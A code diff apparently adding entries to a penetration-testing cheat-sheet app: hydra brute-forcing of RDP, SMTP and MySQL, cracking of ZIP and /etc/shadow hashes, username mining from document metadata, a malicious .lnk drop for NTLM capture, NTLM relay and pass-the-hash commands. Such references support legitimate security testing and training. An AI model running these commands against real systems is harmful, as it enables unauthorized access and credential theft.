@@ -26,6 +26,12 @@ hydra -L users.txt -P rockyou.txt ftp://<target>`,
                     code: `hydra -l administrator -P rockyou.txt rdp://<target>
 hydra -l <user> -P rockyou.txt <target> http-get /`,
                 },
+                {
+                    label: 'RDP / SMTP / MySQL',
+                    code: `hydra -l administrator -P rockyou.txt rdp://<target>
+hydra -L users.txt -P rockyou.txt smtp://<target>
+hydra -l root -P rockyou.txt mysql://<target>`,
+                },
             ],
             tags: ['hydra', 'bruteforce', 'ssh', 'http-post-form'],
         },
@@ -50,6 +56,18 @@ hashcat --help | grep -i '<type>'`,
 hashcat -m 1800 shadow.txt rockyou.txt
 hashcat -m 5600 netntlm.txt rockyou.txt
 john --format=NT --wordlist=rockyou.txt ntlm.txt`,
+                },
+                {
+                    label: 'ZIP / archive hashes',
+                    code: `zip2john backup.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+hashcat -m 13600 zip.hash rockyou.txt   # PKZIP`,
+                },
+                {
+                    label: 'Linux /etc/shadow (unshadow)',
+                    code: `unshadow passwd shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt unshadowed.txt
+hashcat -m 1800 shadow.txt rockyou.txt   # $6$ sha512crypt`,
                 },
             ],
             tags: ['hash', 'ntlm', 'shadow', 'kerberos'],
@@ -130,6 +148,11 @@ rpcclient -U '' -N <target> -c enumdomusers
 ldapsearch -x -H ldap://<dc> -s sub '(objectClass=user)' sAMAccountName
 snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25`,
                 },
+                {
+                    label: 'Mine usernames from files (exiftool)',
+                    code: `exiftool -Author -Creator -LastModifiedBy *.pdf *.docx 2>/dev/null
+# PDF/DOC metadata often names real employees -> build users.txt`,
+                },
             ],
             tags: ['users', 'usernames', 'rid', 'spray'],
         },
@@ -180,6 +203,15 @@ hashcat -m 5600 netntlm.txt rockyou.txt`,
                     code: `impacket-ntlmrelayx -t smb://<target> -smb2support -c 'whoami'
 # coerce: Responder, PetitPotam, or MSSQL xp_dirtree '\\\\<kali-ip>\\share'`,
                 },
+                {
+                    label: 'Slinky (.lnk capture) + relay flags',
+                    code: `# drop a malicious .lnk in a writable share, then capture with responder:
+netexec smb <target> -u <user> -p <pass> -M slinky -o NAME=readme SERVER=<kali-ip>
+# relay without an HTTP server (avoid port 80 clashes):
+impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server
+# build a relay list from hosts with SMB signing off:
+netexec smb <subnet>/24 --gen-relay-list relay.txt`,
+                },
             ],
             tags: ['netntlmv2', 'responder', 'relay', 'ntlmrelayx'],
         },
@@ -202,6 +234,12 @@ impacket-psexec -hashes :<NTLM-hash> Administrator@<target>`,
                     code: `evil-winrm -i <target> -u Administrator -H <NTLM-hash>
 impacket-wmiexec -hashes :<NTLM-hash> Administrator@<target>
 netexec winrm <target> -u Administrator -H <NTLM-hash>`,
+                },
+                {
+                    label: 'smbclient pass-the-hash',
+                    code: `smbclient //<target>/C$ -U <domain>/<user> --pw-nt-hash <NTLM>
+# or netexec:
+netexec smb <target> -u <user> -H <NTLM> --shares`,
                 },
             ],
             tags: ['pth', 'ntlm', 'psexec', 'lateral'],
